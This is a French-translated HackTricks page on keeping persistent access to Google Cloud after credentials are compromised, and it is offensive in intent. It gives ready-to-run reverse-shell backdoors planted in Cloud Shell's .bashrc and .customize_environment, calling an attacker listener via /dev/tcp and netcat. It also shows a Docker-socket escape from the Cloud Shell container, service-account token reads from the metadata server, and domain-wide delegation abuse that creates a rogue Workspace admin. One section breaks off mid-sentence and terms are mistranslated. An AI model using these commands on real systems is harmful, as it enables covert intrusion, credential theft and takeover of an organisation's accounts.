# GCP - Non-svc Persistance

<details>

<summary><strong>Soutenez HackTricks et b√©n√©ficiez d'avantages !</strong></summary>

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou si vous souhaitez acc√©der √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFT exclusifs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez** üí¨ [**le groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).

* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

Ces techniques sont utiles une fois que vous avez compromis des informations d'identification ou une machine GCP.

## Google‚Äôs Cloud Shell <a href="#e5eb" id="e5eb"></a>

### Backdoor persistante

[**Google Cloud Shell**](https://cloud.google.com/shell/) vous fournit un acc√®s en ligne de commande √† vos ressources cloud directement depuis votre navigateur sans aucun co√ªt associ√©.

Vous pouvez acc√©der √† Google Cloud Shell depuis la **console Web** ou en ex√©cutant **`gcloud cloud-shell ssh`**.

Cette console a certaines capacit√©s int√©ressantes pour les attaquants :

1. **Tout utilisateur Google ayant acc√®s √† Google Cloud** a acc√®s √† une instance Cloud Shell enti√®rement authentifi√©e.
2. Cette instance **conservera son r√©pertoire personnel pendant au moins 120 jours** s'il ne se passe aucune activit√©.
3. Il n'y a **aucune capacit√© pour une organisation de surveiller** l'activit√© de cette instance.

Cela signifie essentiellement qu'un attaquant peut mettre une porte d√©rob√©e dans le r√©pertoire personnel de l'utilisateur et tant que l'utilisateur se connecte √† GC Shell tous les 120 jours au moins, la porte d√©rob√©e survivra et l'attaquant obtiendra un shell chaque fois qu'elle sera ex√©cut√©e simplement en faisant :

```bash
echo '(nohup /usr/bin/env -i /bin/bash 2>/dev/null -norc -noprofile >& /dev/tcp/'$CCSERVER'/443 0>&1 &)' >> $HOME/.bashrc
```

Il y a un autre fichier dans le dossier personnel appel√© **`.customize_environment`** qui, s'il existe, sera **ex√©cut√© √† chaque fois** que l'utilisateur acc√®de au **cloud shell** (comme dans la technique pr√©c√©dente). Ins√©rez simplement la porte d√©rob√©e pr√©c√©dente ou une porte d√©rob√©e comme celle-ci pour maintenir la persistance tant que l'utilisateur utilise "fr√©quemment" le cloud shell :

```bash
#!/bin/sh
apt-get install netcat -y
nc <LISTENER-ADDR> 443 -e /bin/bash
```

{% hint style="warning" %}
Notez que la **premi√®re fois qu'une action est effectu√©e dans Cloud Shell qui n√©cessite une authentification**, une fen√™tre d'autorisation **appara√Æt** dans le navigateur de l'utilisateur qui doit √™tre accept√©e avant que la commande ne s'ex√©cute. Si une fen√™tre contextuelle inattendue appara√Æt, la cible pourrait devenir suspicieuse et br√ªler la m√©thode de persistance.
{% endhint %}

### √âvasion de conteneur Google Cloud Shell

Notez que Google Cloud Shell s'ex√©cute √† l'int√©rieur d'un conteneur, vous pouvez donc **facilement vous √©chapper vers l'h√¥te** en faisant :

```bash
sudo docker -H unix:///google/host/var/run/docker.sock pull alpine:latest
sudo docker -H unix:///google/host/var/run/docker.sock run -d -it --name escaper -v "/proc:/host/proc" -v "/sys:/host/sys" -v "/:/rootfs" --network=host --privileged=true --cap-add=ALL alpine:latest
sudo docker -H unix:///google/host/var/run/docker.sock start escaper
sudo docker -H unix:///google/host/var/run/docker.sock exec -it escaper /bin/sh
```

Cela n'est pas consid√©r√© comme une vuln√©rabilit√© par Google, mais cela vous donne une vision plus large de ce qui se passe dans cet environnement.

De plus, notez que depuis l'h√¥te, vous pouvez trouver un jeton de compte de service :

```bash
wget -q -O - --header "X-Google-Metadata-Request: True" "http://metadata/computeMetadata/v1/instance/service-accounts/"
default/
vms-cs-europe-west1-iuzs@m76c8cac3f3880018-tp.iam.gserviceaccount.com/
```

Avec les autorisations suivantes :

```bash
wget -q -O - --header "X-Google-Metadata-Request: True" "http://metadata/computeMetadata/v1/instance/service-accounts/vms-cs-europe-west1-iuzs@m76c8cac3f3880018-tp.iam.gserviceaccount.com/scopes"
https://www.googleapis.com/auth/logging.write
https://www.googleapis.com/auth/monitoring.write
```

## D√©tournement de jeton

### Utilisateur authentifi√©

Si vous parvenez √† acc√©der au dossier personnel d'un **utilisateur authentifi√©
## Propagation vers Workspace via la d√©l√©gation de domaine <a href="#spreading-to-g-suite-via-domain-wide-delegation-of-authority" id="spreading-to-g-suite-via-domain-wide-delegation-of-authority"></a>

[**Workspace**](https://gsuite.google.com) est la plateforme de collaboration et de productivit√© de Google qui comprend des √©l√©ments tels que Gmail, Google Calendar, Google Drive, Google Docs, etc.

Les **comptes de service** dans GCP peuvent se voir accorder les **droits d'acc√®s programmable aux donn√©es utilisateur** dans Workspace en se faisant passer pour des utilisateurs l√©gitimes. Cela est connu sous le nom de [d√©l√©gation de domaine](https://developers.google.com/admin-sdk/reports/v1/guides/delegation). Cela inclut des actions telles que la **lecture** des **e-mails** dans GMail, l'acc√®s √† Google Docs et m√™me la cr√©ation de nouveaux comptes utilisateur dans l'organisation G Suite.

Workspace dispose de [sa propre API](https://developers.google.com/gsuite/aspects/apis), compl√®tement s√©par√©e de GCP. Les autorisations sont accord√©es √† Workspace et **il n'y a pas de relation par d√©faut entre GCP et Workspace**.

Cependant, il est possible de **donner** √† un compte de service **des autorisations** sur un utilisateur Workspace. Si vous avez acc√®s √† l'interface Web √† ce stade, vous pouvez acc√©der √† **IAM -> Comptes de service** et voir si l'un des comptes a **"Activ√©" r√©pertori√© sous la colonne "d√©l√©gation de domaine"**. La colonne elle-m√™me peut **ne pas appara√Ætre si aucun compte n'est activ√©** (vous pouvez lire les d√©tails de chaque compte de service pour confirmer cela). Au moment de la r√©daction de cet article, il n'y a aucun moyen de le faire de mani√®re programmatique, bien qu'il y ait une [demande de cette fonctionnalit√©](https://issuetracker.google.com/issues/116182848) dans le bug tracker de Google.

Pour cr√©er cette relation, il est n√©cessaire de **l'activer dans GCP et √©galement dans Workforce**.

#### Test d'acc√®s √† Workspace

Pour tester cet acc√®s, vous aurez besoin des **informations d'identification du compte de service export√©es au format JSON**. Vous avez peut-√™tre acquis celles-ci √† une √©tape ant√©rieure, ou vous avez peut-√™tre maintenant l'acc√®s requis pour cr√©er une cl√© pour un compte de service que vous savez avoir une d√©l√©gation de domaine activ√©e.

Ce sujet est un peu d√©licat... votre compte de service a quelque chose appel√© "client\_email" que vous pouvez voir dans le fichier d'informations d'identification JSON que vous exportez. Il ressemble probablement √† `nom-du-compte@nom-du-projet.iam.gserviceaccount.com`. Si vous essayez d'acc√©der directement aux appels d'API Workforce avec cet e-mail, m√™me avec la d√©l√©gation activ√©e, vous √©chouerez. Cela est d√ª au fait que l'annuaire Workforce ne comprendra pas les adresses e-mail des comptes de service GCP. Au lieu de cela, pour interagir avec Workforce, nous devons r√©ellement nous faire passer pour des utilisateurs Workforce valides.

Ce que vous voulez vraiment faire, c'est **vous faire passer pour un utilisateur ayant un acc√®s administratif**, puis utiliser cet acc√®s pour faire quelque chose comme **r√©initialiser un mot de passe, d√©sactiver l'authentification multi-facteurs ou simplement cr√©er un nouveau compte administrateur brillant**.

Gitlab a cr√©√© [ce script Python](https://gitlab.com/gitlab-com/gl-security/gl-redteam/gcp\_misc/blob/master/gcp\_delegation.py) qui peut faire deux choses - lister l'annuaire utilisateur et cr√©er un nouveau compte administrateur. Voici comment vous l'utiliseriez :

```bash
# Valider l'acc√®s uniquement
./gcp_delegation.py --keyfile ./credentials.json \
    --impersonate steve.admin@target-org.com \
    --domain target-org.com

# Liste de l'annuaire
./gcp_delegation.py --keyfile ./credentials.json \
    --impersonate steve.admin@target-org.com \
    --domain target-org.com \
    --list

# Cr√©er un nouveau compte administrateur
./gcp_delegation.py --keyfile ./credentials.json \
    --impersonate steve.admin@target-org.com \
    --domain target-org.com \
    --account pwned
```

Vous pouvez essayer ce script sur une gamme d'adresses e-mail pour vous faire passer pour **divers utilisateurs**. La sortie standard indiquera si le compte de service a acc√®s √† Workforce ou non, et inclura un **mot de passe al√©atoire pour le nouveau compte administrateur** s'il est cr√©√©.

Si vous r√©ussissez √† cr√©er un nouveau compte administrateur, vous pouvez vous connecter √† la [console d'administration Google](https://admin.google.com) et avoir un contr√¥le total sur tout dans G Suite pour chaque utilisateur - e-mail, documents, calendrier, etc. Amusez-vous bien.

## R√©f√©rences

* [https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec](https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec)
* [https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-1](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-1)
* [https://securityintelligence.com/posts/attacker-achieve-persistence-google-cloud-platform-cloud-shell/](https://securityintelligence.com/posts/attacker-achieve-persistence-google-cloud-platform-cloud-shell/)

<details>

<summary><strong>Soutenez HackTricks et obtenez des avantages !</strong></summary>

* Si vous voulez voir votre **entreprise annonc√©e dans HackTricks** ou si vous voulez acc√©der √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez** üí¨ [**le groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).

* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>